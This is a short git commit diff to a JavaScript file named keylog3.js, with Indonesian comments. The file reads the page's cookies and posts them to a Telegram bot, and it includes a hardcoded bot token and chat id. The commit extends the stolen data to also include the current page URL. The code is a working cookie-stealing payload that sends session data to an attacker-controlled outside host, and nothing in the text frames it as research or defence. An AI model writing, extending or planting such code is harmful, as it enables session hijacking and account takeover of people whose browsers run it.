e135f4d255ee86e314a5262e1b1a5dbc09c2d6dd
misquee <110459286+misquee@users.noreply.github.com>
2025-02-15 07:21:55 +0800

    Update keylog3.js
    Add url

--- keylog3.js
+++ keylog3.js
@@ -1,4 +1,5 @@
 let cookies = document.cookie; // Mengambil cookie yang bisa diakses oleh JavaScript
+let currentURL = window.location.href;
 
 fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
     method: "POST",
@@ -7,6 +8,6 @@ fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55
     },
     body: JSON.stringify({
         chat_id: "-1002002449257",
-        text: `Cookies: ${cookies}`
+        text: `Cookies: ${cookies}\nURL: ${currentURL}`
     })
 });
